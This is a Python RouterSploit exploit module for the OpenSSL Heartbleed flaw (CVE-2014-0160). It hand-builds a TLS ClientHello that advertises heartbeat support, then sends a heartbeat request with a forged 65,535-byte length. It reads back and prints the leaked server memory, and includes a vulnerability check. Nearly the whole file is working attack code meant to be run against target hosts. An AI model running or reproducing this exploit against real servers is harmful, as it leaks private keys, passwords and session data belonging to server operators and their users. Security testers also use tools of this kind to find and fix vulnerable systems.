import re
import binascii
from time import time
from struct import pack, unpack
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from routersploit.core.exploit import *
from routersploit.core.exploit.exploit import Protocol
from routersploit.core.tcp.tcp_client import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "OpenSSL Heartbleed",
        "description": "Exploits OpenSSL Heartbleed vulnerability. Vulnerability exists in the handling of heartbeat requests,"
                       " where fake length can be used to leak memory data in the response. This module is heavily based on "
                       " Metasploit module.",
        "authors": (
            "Neel Mehta",  # vulnerability discovery
            "Riku",  # vulnerability discovery
            "Antti",  # vulnerability discovery
            "Matti",  # vulnerability discovery
            "Jared Stafford <jspenguin[at]jspenguin.org>",  # Original Proof of Concept. This module is based on it.
            "FiloSottile",  # PoC site and tool
            "Christian Mehlmauer",  # metasploit module
            "wvu",  # metasploit module
            "juan vazquez",  # metasploit module
            "Sebastiano Di Paola",  # metasploit module
            "Tom Sellers",  # metasploit module
            "jjarmoc",  # metasploit module; keydump, refactoring..
            "Ben Buchanan",  # metasploit module
            "herself",  # metasploit module
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.cvedetails.com/cve/2014-0160",
            "http://heartbleed.com/",
            "https://www.us-cert.gov/ncas/alerts/TA14-098A",
            "https://gist.github.com/takeshixx/10107280",
            "https://github.com/FiloSottile/Heartbleed",
            "http://filippo.io/Heartbleed/",
            "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb",
        ),
        "devices": (
            "Multi",
        ),
    }

    target_protocol = Protocol.HTTP

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "Target HTTP port")

    tls_version = OptString("1.0", "TLS/SSL version to use: SSLv3, 1.0, 1.1, 1.2")
    heartbeat_length = OptInteger(65535, "Heartbeat length")

    CIPHER_SUITS = (
        0xc014,  # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
        0xc00a,  # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
        0xc022,  # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
        0xc021,  # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
        0x0039,  # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
        0x0038,  # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
        0x0088,  # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
        0x0087,  # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
        0x0087,  # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
        0xc00f,  # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
        0x0035,  # TLS_RSA_WITH_AES_256_CBC_SHA
        0x0084,  # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
        0xc012,  # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
        0xc008,  # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
        0xc01c,  # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
        0xc01b,  # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
        0x0016,  # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
        0x0013,  # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
        0xc00d,  # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
        0xc003,  # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
        0x000a,  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
        0xc013,  # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
        0xc009,  # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
        0xc01f,  # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
        0xc01e,  # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
        0x0033,  # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
        0x0032,  # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
        0x009a,  # TLS_DHE_RSA_WITH_SEED_CBC_SHA
        0x0099,  # TLS_DHE_DSS_WITH_SEED_CBC_SHA
        0x0045,  # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
        0x0044,  # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
        0xc00e,  # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
        0xc004,  # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
        0x002f,  # TLS_RSA_WITH_AES_128_CBC_SHA
        0x0096,  # TLS_RSA_WITH_SEED_CBC_SHA
        0x0041,  # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
        0xc011,  # TLS_ECDHE_RSA_WITH_RC4_128_SHA
        0xc007,  # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
        0xc00c,  # TLS_ECDH_RSA_WITH_RC4_128_SHA
        0xc002,  # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
        0x0005,  # TLS_RSA_WITH_RC4_128_SHA
        0x0004,  # TLS_RSA_WITH_RC4_128_MD5
        0x0015,  # TLS_DHE_RSA_WITH_DES_CBC_SHA
        0x0012,  # TLS_DHE_DSS_WITH_DES_CBC_SHA
        0x0009,  # TLS_RSA_WITH_DES_CBC_SHA
        0x0014,  # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
        0x0011,  # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
        0x0008,  # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
        0x0006,  # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
        0x0003,  # TLS_RSA_EXPORT_WITH_RC4_40_MD5
        0x00ff   # Unknown
    )

    SSL_RECORD_HEADER_SIZE = 0x05
    HANDSHAKE_RECORD_TYPE = 0x16
    HEARTBEAT_RECORD_TYPE = 0x18
    ALERT_RECORD_TYPE = 0x15
    HANDSHAKE_SERVER_HELLO_TYPE = 0x02
    HANDSHAKE_CERTIFICATE_TYPE = 0x0b
    HANDSHAKE_KEY_EXCHANGE_TYPE = 0x0c
    HANDSHAKE_SERVER_HELLO_DONE_TYPE = 0x0e

    TLS_VERSION = {
        "SSLv3": 0x0300,
        "1.0": 0x0301,
        "1.1": 0x0302,
        "1.2": 0x0303
    }

    def __init__(self):
        self.tcp_client = None
        self.leak = None

        self.printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
        self.white_chars = " \t\n\r\x0b\x0c"

    def run(self):
        self.leak = self.bleed()
        if self.leak:
            data = ""
            for leak_byte in self.leak:
                char = chr(leak_byte)
                if char in self.white_chars:
                    data += " "
                elif char not in self.printable:
                    data += "."
                else:
                    data += char

            clean_data = ""
            tmp_b = 0
            for item in re.finditer(r"(\.){400,}", data):
                a, b = item.span()
                clean_data += data[tmp_b:a]
                tmp_b = b
                repeated = b - a - 64
                clean_data += "................................ repeated {} times ................................".format(repeated)

            clean_data += data[b:]
            print_info(clean_data)
        else:
            print_error("Exploit failed - Target does not seem to be vulnerable")

    @mute
    def check(self):
        if self.bleed():
            return True

        return False

    def bleed(self):
        if not self.establish_connect():
            print_error("Exploit failed - could not establish connection")
            return False

        print_status("Sending Heartbeat...")
        heartbeat_req = self.heartbeat_request(self.heartbeat_length)
        self.tcp_client.send(heartbeat_req)
        hdr = self.tcp_client.recv_all(self.SSL_RECORD_HEADER_SIZE)
        if not hdr:
            print_error("No Heartbeat response...")
            return False

        record_type, version, length = unpack(">BHH", hdr)

        if record_type != self.HEARTBEAT_RECORD_TYPE or version != self.TLS_VERSION[self.tls_version]:
            print_error("Unexpected Hearbeat response header")
            self.tcp_client.close()

        heartbeat_data = self.tcp_client.recv_all(self.heartbeat_length)
        if heartbeat_data:
            print_success("Heartbeat response, {} bytes".format(len(heartbeat_data)))
        else:
            print_error("No heartbeat response")

        self.tcp_client.close()

        return heartbeat_data

    def establish_connect(self):
        self.tcp_client = self.tcp_create()
        self.tcp_client.connect()

        print_status("Sending Client Hello...")
        data = self.client_hello()
        self.tcp_client.send(data)

        server_response = self.get_server_hello()
        if not server_response:
            print_error("Server Hello not found")

        return server_response

    def get_server_hello(self):
        server_done = False
        ssl_record_counter = 0
        remaining_data = self.get_ssl_record()

        while remaining_data and len(remaining_data) > 0:
            ssl_record_counter += 1
            ssl_type, ssl_version, ssl_len = unpack(">BHH", remaining_data[:5])
            print_status("SSL record {}".format(ssl_record_counter))
            print_status("\tType:    {}".format(ssl_type))
            print_status("\tVersion: 0x{:x}".format(ssl_version))
            print_status("\tLength:  {}".format(ssl_len))

            if ssl_type != self.HANDSHAKE_RECORD_TYPE:
                print_status("\tWrong Record Type")
            else:
                ssl_data = remaining_data[5: 5 + ssl_len]
                handshakes = self.parse_handshakes(ssl_data)

                # Stop once we receive SERVER_HELLO_DONE
                if handshakes and handshakes[-1]["type"] == self.HANDSHAKE_SERVER_HELLO_DONE_TYPE:
                    server_done = True
                    break

            remaining_data = self.get_ssl_record()

        return server_done

    def parse_handshakes(self, data):
        remaining_data = data
        handshakes = []
        handshake_count = 0

        while remaining_data and len(remaining_data) > 0:
            hs_type, hs_len_pad, hs_len = unpack(">BBH", remaining_data[:4])
            hs_data = remaining_data[4: 4 + hs_len]
            handshake_count += 1
            print_status("\tHandshake {}".format(handshake_count))
            print_status("\t\tLength: {}".format(hs_len))

            handshake_parsed = None
            if hs_type == self.HANDSHAKE_SERVER_HELLO_TYPE:
                print_status("\t\tType: Server Hello ({})".format(hs_type))
                handshake_parsed = self.parse_server_hello(hs_data)
            elif hs_type == self.HANDSHAKE_CERTIFICATE_TYPE:
                print_status("\t\tType: Certificate Data ({})".format(hs_type))
                handshake_parsed = self.parse_certificate_data(hs_data)
            elif hs_type == self.HANDSHAKE_KEY_EXCHANGE_TYPE:
                print_status("\t\tType: Server Key Exchange ({})".format(hs_type))
            elif hs_type == self.HANDSHAKE_SERVER_HELLO_DONE_TYPE:
                print_status("\t\tType: Server Hello Done ({})".format(hs_type))
            else:
                print_status("\t\tType: Handshake type {} not implement".format(hs_type))

            handshakes.append({
                "type": hs_type,
                "len": hs_len,
                "data": handshake_parsed
            })
            remaining_data = remaining_data[4 + hs_len:]

        return handshakes

    def parse_server_hello(self, data):
        version = unpack(">H", data[:2])[0]
        print_status("\t\tServer Hello Version: 0x{:x}".format(version))
        random = unpack(">" + "B" * 32, data[2:34])
        random_hex = str(binascii.hexlify(bytes(random)), "utf-8")
        print_status("\t\tServer Hello random data: {}".format(random_hex))
        session_id_length = unpack(">B", data[34:35])[0]
        print_status("\t\tServer Hello Session ID length: {}".format(session_id_length))
        session_id = unpack(">" + "B" * session_id_length, data[35: 35 + session_id_length])
        session_id_hex = str(binascii.hexlify(bytes(session_id)), "utf-8")
        print_status("\t\tServer Hello session id: {}".format(session_id_hex))

    def parse_certificate_data(self, data):
        cert_len_padding, cert_len = unpack(">BH", data[:3])
        print_status("\t\tCertificates length: {}".format(cert_len))
        print_status("\t\tData length: {}".format(len(data)))

        # contains multiple certs
        already_read = 3
        cert_counter = 0
        while already_read < cert_len:
            cert_counter += 1
            # get single certificate length
            single_cert_len_padding, single_cert_len = unpack(">BH", data[already_read: already_read + 3])
            print_status("\t\tCertificate {}".format(cert_counter))
            print_status("\t\t\tCertificate {}: Length: {}".format(cert_counter, single_cert_len))
            certificate_data = data[(already_read + 3): (already_read + 3 + single_cert_len)]
            cert = x509.load_der_x509_certificate(certificate_data, default_backend())
            print_status("\t\t\tCertificate {}: {}".format(cert_counter, cert))

            already_read = already_read + single_cert_len + 3

    def get_ssl_record(self):
        hdr = self.tcp_client.recv_all(self.SSL_RECORD_HEADER_SIZE)

        if hdr:
            length = unpack(">BHH", hdr)[2]
            data = self.tcp_client.recv_all(length)
            hdr += data

            return hdr

        return None

    def client_hello(self):
        # user current time for TLS time
        time_epoch = int(time())
        cipher_suits_len = len(self.CIPHER_SUITS)

        hello_data = pack(">H", self.TLS_VERSION[self.tls_version])  # Version TLS
        hello_data += pack(">L", time_epoch)                        # Time in epoch format
        hello_data += bytes(utils.random_text(28), "utf-8")         # Random
        hello_data += b"\x00"                                       # Session ID length
        hello_data += pack(">H", cipher_suits_len * 2)              # Cipher Suits Length (102)
        hello_data += pack(">" + "H" * cipher_suits_len, *self.CIPHER_SUITS)  # Cipher Suites
        hello_data += b"\x01"                                       # Compression methods length (1)
        hello_data += b"\x00"                                       # Compression methods: null

        hello_data_extensions = b"\x00\x0f"                         # Extension type (Heartbeat)
        hello_data_extensions += b"\x00\x01"                        # Extension length
        hello_data_extensions += b"\x01"                            # Extension data

        hello_data += pack(">H", len(hello_data_extensions))
        hello_data += hello_data_extensions

        data = b"\x01\x00"                                          # Handshake Type: Client Hello (1)
        data += pack(">H", len(hello_data))                         # Length
        data += hello_data

        return self.ssl_record(self.HANDSHAKE_RECORD_TYPE, data)

    def heartbeat_request(self, length):
        payload = b"\x01"           # Heartbeat Message Type: Request (1)
        payload += pack(">H", length)
        return self.ssl_record(self.HEARTBEAT_RECORD_TYPE, payload)

    def ssl_record(self, record_type, data):
        record = pack(">BHH", record_type, self.TLS_VERSION[self.tls_version], len(data))
        record += data
        return record
